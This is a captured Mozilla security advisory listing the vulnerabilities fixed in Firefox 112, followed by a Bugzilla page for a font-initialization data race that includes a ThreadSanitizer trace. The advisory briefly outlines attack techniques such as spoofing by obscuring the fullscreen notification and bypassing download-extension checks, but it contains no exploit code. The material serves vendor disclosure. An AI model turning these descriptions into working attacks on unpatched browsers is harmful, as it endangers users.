=== Content from www.mozilla.org_acf64303_20250115_090637.html ===


## Help us improve your Mozilla experience

In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.

Accept All Additional Cookies

Reject All Additional Cookies

[Cookie settings](/en-US/privacy/websites/cookie-settings/)

Menu
[![Mozilla](https://www.mozilla.org/media/img/logos/m24/lockup-black.f2ddba3f0724.svg)](/en-US/)

* [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
  Firefox browsers](/en-US/firefox/)
  Close Firefox browsers menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Desktop](/en-US/firefox/new/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for iOS](/en-US/firefox/browsers/mobile/ios/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Android](/en-US/firefox/browsers/mobile/android/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/focus/logo.aac3e33175cb.svg)
    ## Firefox Focus](/en-US/firefox/browsers/mobile/focus/)
  + [## Firefox blog](https://blog.mozilla.org/firefox/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=firefox)
* [Products](/en-US/products/)
  Close Products menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/mozilla/vpn/logo.c648f487bfb8.svg)
    ## Mozilla VPN](/en-US/products/vpn/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/monitor/logo.d97e5516f9e6.svg)
    ## Mozilla Monitor](https://monitor.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/relay/logo-white.d42a8b52e44c.svg)
    ## Firefox Relay](https://relay.firefox.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/pocket/logo.17446bc33a5d.svg)
    ## Pocket](https://getpocket.com/firefox_learnmore/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/nav/icons/icon-mdn-plus.f54475f980ab.svg)
    ## MDN Plus](https://developer.mozilla.org/plus?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/fakespot/logo-blue.3973b8fe9631.svg)
    ## Fakespot](https://fakespot.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/thunderbird/logo-thunderbird.121e9c0fed45.svg)
    ## Thunderbird](https://www.thunderbird.net/)

  [All products](/en-US/products/)
* [About us](/en-US/about/)
  Close About us menu

  Our Mission

  + [## About Mozilla](/en-US/about/)
  + [## The Mozilla Manifesto](/en-US/about/manifesto/)
  + [## Get Involved](/en-US/contribute/)
  + [## Innovation Projects](https://future.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Blog](https://blog.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)

  Our Work

  + [## Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla.ai](https://www.mozilla.ai/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Ventures](https://mozilla.vc/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Advertising](/en-US/advertising/)

## Menu

* Mozilla Security

## [Mozilla Security](/en-US/security/)

* [Advisories](/en-US/security/advisories/)
* [Known Vulnerabilities](/en-US/security/known-vulnerabilities/)
* [Mozilla Security Blog](https://blog.mozilla.com/security/)
* [Security Bug Bounty](/en-US/security/bug-bounty/)
* [Third-party Injection Policy](/en-US/security/third-party-software-injection/)

## [Client Bug Bounty](/en-US/security/client-bug-bounty/)

* [Frequently Asked Questions](/en-US/security/bug-bounty/faq/)
* [Hall of Fame](/en-US/security/bug-bounty/hall-of-fame/)

## [Web Bug Bounty](/en-US/security/web-bug-bounty/)

* [Eligible Websites](/en-US/security/bug-bounty/web-eligible-sites/)
* [Frequently Asked Questions](/en-US/security/bug-bounty/faq-webapp/)
* [Hall of Fame](/en-US/security/bug-bounty/web-hall-of-fame/)

# Mozilla Foundation Security Advisory 2023-13

## Security Vulnerabilities fixed in Firefox 112, Firefox for Android 112, Focus for Android 112

Announced
April 11, 2023
Impact
high
Products
Firefox, Firefox for Android, Focus for Android
Fixed in

* Firefox 112
* Firefox for Android 112
* Focus for Android 112

#### [#CVE-2023-29531: Out-of-bound memory access in WebGL on macOS](#CVE-2023-29531)

Reporter
DoHyun Lee
Impact
high
##### Description

An attacker could have caused an out of bounds memory access using WebGL APIs, leading to memory corruption and a potentially exploitable crash.
*This bug only affects Firefox for macOS. Other operating systems are unaffected.*

##### References

* [Bug 1794292](https://bugzilla.mozilla.org/show_bug.cgi?id=1794292)

#### [#CVE-2023-29532: Mozilla Maintenance Service Write-lock bypass](#CVE-2023-29532)

Reporter
Holger Fuhrmannek
Impact
high
##### Description

A local attacker can trick the Mozilla Maintenance Service into applying an unsigned update file by pointing the service at an update file on a malicious SMB server. The update file can be replaced after the signature check, before the use, because the write-lock requested by the service does not work on a SMB server.
*Note: This attack requires local system access and only affects Windows. Other operating systems are not affected.*

##### References

* [Bug 1806394](https://bugzilla.mozilla.org/show_bug.cgi?id=1806394)

#### [#CVE-2023-29533: Fullscreen notification obscured](#CVE-2023-29533)

Reporter
Irvan Kurniawan
Impact
high
##### Description

A website could have obscured the fullscreen notification by using a combination of `window.open`, fullscreen requests, `window.name` assignments, and `setInterval` calls. This could have led to user confusion and possible spoofing attacks.

##### References

* [Bug 1814597](https://bugzilla.mozilla.org/show_bug.cgi?id=1814597)
* [Bug 1798219](https://bugzilla.mozilla.org/show_bug.cgi?id=1798219)

#### [#CVE-2023-29534: Fullscreen notification could have been obscured on Firefox for Android](#CVE-2023-29534)

Reporter
Shaheen Fazim and Hafiizh
Impact
high
##### Description

Different techniques existed to obscure the fullscreen notification in Firefox and Focus for Android. These could have led to potential user confusion and spoofing attacks.
*This bug only affects Firefox and Focus for Android. Other versions of Firefox are unaffected.*

##### References

* [Bug 1816059](https://bugzilla.mozilla.org/show_bug.cgi?id=1816059)
* [Bug 1816007](https://bugzilla.mozilla.org/show_bug.cgi?id=1816007)
* [Bug 1821155](https://bugzilla.mozilla.org/show_bug.cgi?id=1821155)
* [Bug 1821576](https://bugzilla.mozilla.org/show_bug.cgi?id=1821576)
* [Bug 1821906](https://bugzilla.mozilla.org/show_bug.cgi?id=1821906)
* [Bug 1822298](https://bugzilla.mozilla.org/show_bug.cgi?id=1822298)
* [Bug 1822305](https://bugzilla.mozilla.org/show_bug.cgi?id=1822305)

#### [#CVE-2023-1999: Double-free in libwebp](#CVE-2023-1999)

Reporter
Irvan Kurniawan
Impact
high
##### Description

A double-free in libwebp could have led to memory corruption and a potentially exploitable crash.

##### References

* [Bug 1819244](https://bugzilla.mozilla.org/show_bug.cgi?id=1819244)

#### [#CVE-2023-29535: Potential Memory Corruption following Garbage Collector compaction](#CVE-2023-29535)

Reporter
Lukas Bernhard
Impact
high
##### Description

Following a Garbage Collector compaction, weak maps may have been accessed before they were correctly traced. This resulted in memory corruption and a potentially exploitable crash.

##### References

* [Bug 1820543](https://bugzilla.mozilla.org/show_bug.cgi?id=1820543)

#### [#CVE-2023-29536: Invalid free from JavaScript code](#CVE-2023-29536)

Reporter
zx from qriousec
Impact
high
##### Description

An attacker could cause the memory manager to incorrectly free a pointer that addresses attacker-controlled memory, resulting in an assertion, memory corruption, or a potentially exploitable crash.

##### References

* [Bug 1821959](https://bugzilla.mozilla.org/show_bug.cgi?id=1821959)

#### [#CVE-2023-29537: Data Races in font initialization code](#CVE-2023-29537)

Reporter
Looben Yang
Impact
high
##### Description

Multiple race conditions in the font initialization could have led to memory corruption and execution of attacker-controlled code.

##### References

* [Bug 1823365](https://bugzilla.mozilla.org/show_bug.cgi?id=1823365)
* [Bug 1824200](https://bugzilla.mozilla.org/show_bug.cgi?id=1824200)
* [Bug 1825569](https://bugzilla.mozilla.org/show_bug.cgi?id=1825569)

#### [#CVE-2023-29538: Directory information could have been leaked to WebExtensions](#CVE-2023-29538)

Reporter
Alexis aka zoracon
Impact
moderate
##### Description

Under specific circumstances a WebExtension may have received a `jar:file:///` URI instead of a `moz-extension:///` URI during a load request. This leaked directory paths on the user's machine.

##### References

* [Bug 1685403](https://bugzilla.mozilla.org/show_bug.cgi?id=1685403)

#### [#CVE-2023-29539: Content-Disposition filename truncation leads to Reflected File Download](#CVE-2023-29539)

Reporter
Trung Pham
Impact
moderate
##### Description

When handling the filename directive in the Content-Disposition header, the filename would be truncated if the filename contained a NULL character. This could have led to reflected file download attacks potentially tricking users to install malware.

##### References

* [Bug 1784348](https://bugzilla.mozilla.org/show_bug.cgi?id=1784348)

#### [#CVE-2023-29540: Iframe sandbox bypass using redirects and sourceMappingUrls](#CVE-2023-29540)

Reporter
Axel Chong (@Haxatron)
Impact
moderate
##### Description

Using a redirect embedded into `sourceMappingUrls` could allow for navigation to external protocol links in sandboxed iframes without `allow-top-navigation-to-custom-protocols`.

##### References

* [Bug 1790542](https://bugzilla.mozilla.org/show_bug.cgi?id=1790542)

#### [#CVE-2023-29541: Files with malicious extensions could have been downloaded unsafely on Linux](#CVE-2023-29541)

Reporter
Ameen Basha M K
Impact
moderate
##### Description

Firefox did not properly handle downloads of files ending in `.desktop`, which can be interpreted to run attacker-controlled commands.
*This bug only affects Firefox for Linux on certain Distributions. Other operating systems are unaffected, and Mozilla is unable to enumerate all affected Linux Distributions.*

##### References

* [Bug 1810191](https://bugzilla.mozilla.org/show_bug.cgi?id=1810191)

#### [#CVE-2023-29542: Bypass of file download extension restrictions](#CVE-2023-29542)

Reporter
Shaheen Fazim and Ameen Basha M K
Impact
moderate
##### Description

A newline in a filename could have been used to bypass the file extension security mechanisms that replace malicious file extensions such as .lnk with .download. This could have led to accidental execution of malicious code.
*This bug only affects Firefox on Windows. Other versions of Firefox are unaffected.*

##### References

* [Bug 1815062](https://bugzilla.mozilla.org/show_bug.cgi?id=1815062)
* [Bug 1810793](https://bugzilla.mozilla.org/show_bug.cgi?id=1810793)

#### [#CVE-2023-29543: Use-after-free in debugging APIs](#CVE-2023-29543)

Reporter
Lukas Bernhard
Impact
moderate
##### Description

An attacker could have caused memory corruption and a potentially exploitable use-after-free of a pointer in a global object's debugger vector.

##### References

* [Bug 1816158](https://bugzilla.mozilla.org/show_bug.cgi?id=1816158)

#### [#CVE-2023-29544: Memory Corruption in garbage collector](#CVE-2023-29544)

Reporter
Lukas Bernhard
Impact
moderate
##### Description

If multiple instances of resource exhaustion occurred at the incorrect time, the garbage collector could have caused memory corruption and a potentially exploitable crash.

##### References

* [Bug 1818781](https://bugzilla.mozilla.org/show_bug.cgi?id=1818781)

#### [#CVE-2023-29545: Windows Save As dialog resolved environment variables](#CVE-2023-29545)

Reporter
Axel Chong (@Haxatron)
Impact
moderate
##### Description

Similar to CVE-2023-28163, this time when choosing 'Save Link As', suggested filenames containing environment variable names would have resolved those in the context of the current user.
*This bug only affects Firefox on Windows. Other versions of Firefox are unaffected.*

##### References

* [Bug 1823077](https://bugzilla.mozilla.org/show_bug.cgi?id=1823077)

#### [#CVE-2023-29546: Screen recording in Private Browsing included address bar on Android](#CVE-2023-29546)

Reporter
Irwan
Impact
low
##### Description

When recording the screen while in Private Browsing on Firefox for Android the address bar and keyboard were not hidden, potentially leaking sensitive information.
*This bug only affects Firefox for Android. Other operating systems are unaffected.*

##### References

* [Bug 1780842](https://bugzilla.mozilla.org/show_bug.cgi?id=1780842)

#### [#CVE-2023-29547: Secure document cookie could be spoofed with insecure cookie](#CVE-2023-29547)

Reporter
Marco Squarcina
Impact
low
##### Description

When a secure cookie existed in the Firefox cookie jar an insecure cookie for the same domain could have been created, when it should have silently failed. This could have led to a desynchronization in expected results when reading from the secure cookie.

##### References

* [Bug 1783536](https://bugzilla.mozilla.org/show_bug.cgi?id=1783536)

#### [#CVE-2023-29548: Incorrect optimization result on ARM64](#CVE-2023-29548)

Reporter
JunYoung Park
Impact
low
##### Description

A wrong lowering instruction in the ARM64 Ion compiler resulted in a wrong optimization result.

##### References

* [Bug 1822754](https://bugzilla.mozilla.org/show_bug.cgi?id=1822754)

#### [#CVE-2023-29549: Javascript's bind function may have failed](#CVE-2023-29549)

Reporter
Lukas Bernhard
Impact
low
##### Description

Under certain circumstances, a call to the `bind` function may have resulted in the incorrect realm. This may have created a vulnerability relating to JavaScript-implemented sandboxes such as SES.

##### References

* [Bug 1823042](https://bugzilla.mozilla.org/show_bug.cgi?id=1823042)

#### [#CVE-2023-29550: Memory safety bugs fixed in Firefox 112 and Firefox ESR 102.10](#CVE-2023-29550)

Reporter
Mozilla developers and community
Impact
high
##### Description

Mozilla developers Randell Jesup, Andrew Osmond, Sebastian Hengst, Andrew McCreight, and the Mozilla Fuzzing Team reported memory safety bugs present in Firefox 111 and Firefox ESR 102.9. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 112 and Firefox ESR 102.10](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1720594%2C1812498%2C1814217%2C1818357%2C1751945%2C1818762%2C1819493%2C1820389%2C1820602%2C1821448%2C1822413%2C1824828)

#### [#CVE-2023-29551: Memory safety bugs fixed in Firefox 112](#CVE-2023-29551)

Reporter
Mozilla developers and community
Impact
high
##### Description

Mozilla developers Randell Jesup, Andrew McCreight, Gabriele Svelto, and the Mozilla Fuzzing Team reported memory safety bugs present in Firefox 111. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 112](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1763625%2C1814314%2C1815798%2C1815890%2C1819239%2C1819465%2C1819486%2C1819492%2C1819957%2C1820514%2C1820776%2C1821838%2C1822175%2C1823547)

## Company

* [Leadership](/about/leadership/)
* [Press Center](https://blog.mozilla.org/category/mozilla/news/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=company)
* [Careers](/en-US/careers/)
* [Contact](/en-US/contact/)

## Support

* [Product Help](https://support.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [File a Bug](https://bugzilla.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [Localize Mozilla](https://pontoon.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)

## Resources

* [Advertise with Mozilla](/en-US/advertising/)
* [Firefox Release Notes](/firefox/134.0.1/releasenotes/)

## Developers

* [Developer Edition](/en-US/firefox/developer/)
* [Enterprise](/en-US/firefox/enterprise/)
* [Tools](https://firefox-source-docs.mozilla.org/devtools-user/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=developers)
* [MDN](https://developer.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer)

## Follow @Mozilla

* [X (formerly Twitter) (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)
* [LinkedIn (@mozilla)](https://www.linkedin.com/company/mozilla-corporation/)
* [TikTok (@mozilla)](https://www.tiktok.com/%40mozilla)
* [Spotify (@mozilla)](https://open.spotify.com/show/0vT7LJMeVDxyQ2ZamHKu08?si=_uDRD6bRR_6M5YZyISGXgA)

## Follow @Firefox

* [X (formerly Twitter) (@firefox)](https://twitter.com/firefox)
* [Instagram (@firefox)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)
* [TikTok (@firefox)](https://www.tiktok.com/%40firefox)

[Donate](https://foundation.mozilla.org/?form=moco-donate-footer)

Visit [Mozilla Corporation’s](/en-US/) not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer).

Portions of this content are ©1998–2025 by individual mozilla.org contributors. Content available under a [Creative Commons license](/en-US/foundation/licensing/website-content/).

* [Website Privacy Notice](/en-US/privacy/websites/)
* [Cookies](/en-US/privacy/websites/cookie-settings/)
* [Legal](/en-US/about/legal/)
* [Community Participation Guidelines](/en-US/about/governance/policies/participation/)
* [About this site](/en-US/about/this-site/)

![](https://www.mozilla.org/media/img/logos/m24/wordmark-white.2d673bb5b33a.svg)



=== Content from bugzilla.mozilla.org_704e37bf_20250115_090635.html ===


![](/static/v20250114.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Copy Summary▾

* Markdown
* Markdown (bug number)
* Plain Text
* HTML

View ▾

* Reset Sections
* Expand All Sections
* Collapse All Sections
* History
* [JSON](/rest/bug/1824200)
* [XML](/show_bug.cgi?ctype=xml&id=1824200)

Closed
[Bug 1824200](/show_bug.cgi?id=1824200)

Opened 2 years ago
Closed 2 years ago

# [tsan] data race initializing the SharedFTFace in gfxFontconfigFontEntry::GetFTFace

\*
[Summary:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc)

[tsan] data race initializing the SharedFTFace in gfxFontconfigFontEntry::GetFTFace

## Categories

### (Core :: Graphics: Text, defect)

[Product:](/describecomponents.cgi?product=Core)

Core
▾

Core
Shared components used by Firefox and other Mozilla software, including handling of Web content; Gecko, HTML, CSS, layout, DOM, scripts, images, networking, etc. Issues with web page layout probably go here, while Firefox user interface issues belong in the [Firefox](https://bugzilla.mozilla.org/describecomponents.cgi?product=Firefox) product. ([More info](https://wiki.mozilla.org/Modules/All#Core))
[See Open Bugs in This Product](/buglist.cgi?product=Core&bug_status=__open__)
[File New Bug in This Product](/enter_bug.cgi?product=Core)
Watch This Product

[Component:](/describecomponents.cgi?product=Core&component=Graphics%3A%20Text#Graphics%3A%20Text)

Graphics: Text
▾

Core :: Graphics: Text

Issues with glyph rasterization and painting, font format support, and interfacing with platform font APIs. For issues with font selection, text shaping, and glyph selection, see the Layout: Text and Fonts component.

[See Open Bugs in This Component](/buglist.cgi?product=Core&component=Graphics%3A%20Text&bug_status=__open__)
[Recently Fixed Bugs in This Component](/buglist.cgi?product=Core&component=Graphics%3A%20Text&chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__)
[File New Bug in This Component](/enter_bug.cgi?product=Core&component=Graphics%3A%20Text)
Watch This Component

[Version:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#version)

Firefox 113

[Platform:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform)

All

All

[Type:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type)

defect

[Priority:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority)

*Not set*

[Severity:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity)

--

Points:

---

## Tracking

### ()

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED
FIXED

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED

FIXED

Mark as Assigned

[Milestone:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone)

113 Branch

Iteration:

---

[Project Flags:](https://wiki.mozilla.org/BMO/UserGuide#Project_Flags)

| Webcompat Score | --- |
| --- | --- |
| a11y-review | --- |
| Performance Impact | --- |
| Accessibility Severity | --- |
| Webcompat Priority | --- |

[Tracking Flags:](https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags)

|  | Tracking | Status |
| --- | --- | --- |
| firefox-esr102 | --- | [unaffected](/buglist.cgi?f1=cf_status_firefox_esr102&o1=equals&v1=unaffected) |
| firefox111 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox111&o1=equals&v1=wontfix) |
| firefox112 | [+](/buglist.cgi?f1=cf_tracking_firefox112&o1=equals&v1=%2B) | [fixed](/buglist.cgi?f1=cf_status_firefox112&o1=equals&v1=fixed) |
| firefox113 | [+](/buglist.cgi?f1=cf_tracking_firefox113&o1=equals&v1=%2B) | [fixed](/buglist.cgi?f1=cf_status_firefox113&o1=equals&v1=fixed) |

|  | Tracking | Status |
| --- | --- | --- |
| relnote-firefox |  | --- |
| thunderbird\_esr115 | --- | --- |
| thunderbird\_esr128 | --- | --- |
| firefox-esr102 |  | unaffected |
| firefox-esr115 | --- | --- |
| firefox-esr128 | --- | --- |
| firefox111 |  | wontfix |
| firefox112 | + | fixed |
| firefox113 | + | fixed |
| firefox134 | --- | --- |
| firefox135 | --- | --- |
| firefox136 | --- | --- |

## People

### (Reporter: jfkthame, Assigned: jfkthame)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

![](https://secure.gravatar.com/avatar/e0f9759e1d7514ae4adfd806869e3c5d?d=mm&size=40)  [jfkthame](/user_profile?user_id=329583)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

Reset Assignee to default

[Mentors:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor)

---

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

Reset QA Contact to default

[Reporter:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter)

![](https://secure.gravatar.com/avatar/e0f9759e1d7514ae4adfd806869e3c5d?d=mm&size=40)  [jfkthame](/user_profile?user_id=329583)

[Triage Owner:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner)

![](https://secure.gravatar.com/avatar/029a38b9773f1943419c24b7c3d93761?d=mm&size=40)  [lsalzman](/user_profile?user_id=536714)

[CC:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc)

10 people

## References

[Depends on:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson)

[CVE-2023-29537](/show_bug.cgi?id=1823365 "VERIFIED FIXED - initialization race leading to use after free in MakeGlyphAtlas()")

[Blocks:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks)

---

Dependency [tree](/showdependencytree.cgi?id=1824200&hide_resolved=1)
/ [graph](/showdependencygraph.cgi?id=1824200)

[Regressions:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses)

---

[Regressed by:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by)

---

[URL:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc)

[See Also:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also)

[1825569](/show_bug.cgi?id=1825569 "RESOLVED FIXED - [tsan] data races in Android font backend (FT2FontEntry)")

## Details

### (4 keywords, Whiteboard: [post-critsmash-triage][adv-main112+])

[Alias:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias)

---

[Keywords:](/describekeywords.cgi)

[csectype-race](/buglist.cgi?keywords=csectype-race&resolution=---),
[reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---),
[sec-high](/buglist.cgi?keywords=sec-high&resolution=---),
[testcase](/buglist.cgi?keywords=testcase&resolution=---)

[Whiteboard:](https://wiki.mozilla.org/BMO/UserGuide/Whiteboard)

[post-critsmash-triage][adv-main112+]

QA Whiteboard:

---

Has STR:

---

Change Request:

---

[Votes:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes)

0

Bug Flags:

| [dveditz](/user_profile?user_id=1689) | [sec-bounty](#c18 "2 years ago") | + |
| --- | --- | --- |
| [dveditz](/user_profile?user_id=1689) | sec-bounty | + |
| --- | --- | --- |
| [btot](/user_profile?user_id=553429) | [qe-verify](#a1027687_553429 "2 years ago") | - |
| --- | --- | --- |
| [btot](/user_profile?user_id=553429) | qe-verify | - |
| --- | --- | --- |
|  | behind-pref |  |
| --- | --- | --- |
|  | firefox-backlog |  |
|  | sec-bounty-hof |  |
|  | in-qa-testsuite |  | | |
|  | in-testsuite |  |

## Crash Data

Signature:

*None*

## Security

### (public)

This bug is publicly visible.

## User Story

## Attachments

### (6 files)

| [Bug 1824200 - Make mFTFace an atomic pointer. r=lsalzman](/attachment.cgi?id=9325039)  [2 years ago](#c1)  [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583)   48 bytes, text/x-phabricator-request | diannaS : [approval-mozilla-beta+](#c16 "2 years ago")  tjr : [sec-approval+](#a430906_578488 "2 years ago") | [Details](/attachment.cgi?id=9325039&action=edit) | [Review](/attachment.cgi?id=9325039) |
| --- | --- | --- |
| [post-patch-tsan.txt](/attachment.cgi?id=9325057)  [2 years ago](#c3)  [Tyson Smith [:tsmith]](/user_profile?user_id=486634)   68.10 KB, text/plain |  | [Details](/attachment.cgi?id=9325057&action=edit) |
| [Bug 1824200 - Also make the has-variations state atomic. r=lsalzman](/attachment.cgi?id=9325073)  [2 years ago](#c5)  [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583)   48 bytes, text/x-phabricator-request | diannaS : [approval-mozilla-beta+](#a587856_690067 "2 years ago")  tjr : [sec-approval+](#a430903_578488 "2 years ago") | [Details](/attachment.cgi?id=9325073&action=edit) | [Review](/attachment.cgi?id=9325073) |
| [post-patch-tsan-2.txt](/attachment.cgi?id=9325076)  [2 years ago](#c7)  [Tyson Smith [:tsmith]](/user_profile?user_id=486634)   74.73 KB, text/plain |  | [Details](/attachment.cgi?id=9325076&action=edit) |
| [Bug 1824200 - Lock around access to mUnscaledFontCache. r=lsalzman](/attachment.cgi?id=9325078)  [2 years ago](#c8)  [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583)   48 bytes, text/x-phabricator-request | diannaS : [approval-mozilla-beta+](#a587863_690067 "2 years ago")  tjr : [sec-approval+](#c13 "2 years ago") | [Details](/attachment.cgi?id=9325078&action=edit) | [Review](/attachment.cgi?id=9325078) |
| [advisory.txt](/attachment.cgi?id=9327571)  [2 years ago](#c19)  [Tom Ritter [:tjr]](/user_profile?user_id=578488)   12 bytes, text/plain |  | [Details](/attachment.cgi?id=9327571&action=edit) |

Bottom ↓
Tags ▾

* Reset

Timeline ▾

* Reset
* Collapse All
* Expand All
* Comments Only

|  | [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583)  Assignee |  |
| --- | --- | --- |
| [Description](/show_bug.cgi?id=1824200#c0)• 2 years ago |
|  | |

+++ This bug was initially created as a clone of [Bug #1823365](/show_bug.cgi?id=1823365 "VERIFIED FIXED - initialization race leading to use after free in MakeGlyphAtlas()") +++

After fixing the originally-reported missing-glyph atlas issue, Tyson is still seeing another, unrelated data race with the same testcase; see [bug 1823365 comment 11](/show_bug.cgi?id=1823365#c11 "VERIFIED FIXED - initialization race leading to use after free in MakeGlyphAtlas()"), and [attachment 9324553](/attachment.cgi?id=9324553 "tsan.txt") [[details]](/attachment.cgi?id=9324553&action=edit "tsan.txt").

The race here involved the fontconfig backend and its management of the FreeType face:

```
WARNING: ThreadSanitizer: data race (pid=104338)
  Read of size 8 at 0x7b5400001d60 by thread T18:
    #0 RefPtr /builds/worker/workspace/obj-build/dist/include/mozilla/RefPtr.h:97:27 (libxul.so+0x5917041) (BuildId: 9ee4bdacd12c56311ad459908123f344c17c0ace)
    #1 gfxFontconfigFontEntry::CreateFontInstance(gfxFontStyle const*) /builds/worker/checkouts/gecko/gfx/thebes/gfxFcPlatformFontList.cpp:859:31 (libxul.so+0x5917041)
    #2 gfxFontEntry::FindOrMakeFont(gfxFontStyle const*, gfxCharacterMap*) /builds/worker/checkouts/gecko/gfx/thebes/gfxFontEntry.cpp:266:22 (libxul.so+0x5947cfe) (BuildId: 9ee4bdacd12c56311ad459908123f344c17c0ace)

```

vs

```
  Previous write of size 8 at 0x7b5400001d60 by thread T20:
    #0 assign_assuming_AddRef /builds/worker/workspace/obj-build/dist/include/mozilla/RefPtr.h:71:13 (libxul.so+0x59162e3) (BuildId: 9ee4bdacd12c56311ad459908123f344c17c0ace)
    #1 operator=<mozilla::gfx::SharedFTFace> /builds/worker/workspace/obj-build/dist/include/mozilla/RefPtr.h:226:5 (libxul.so+0x59162e3)
    #2 gfxFontconfigFontEntry::GetFTFace() /builds/worker/checkouts/gecko/gfx/thebes/gfxFcPlatformFontList.cpp:941:13 (libxul.so+0x59162e3)
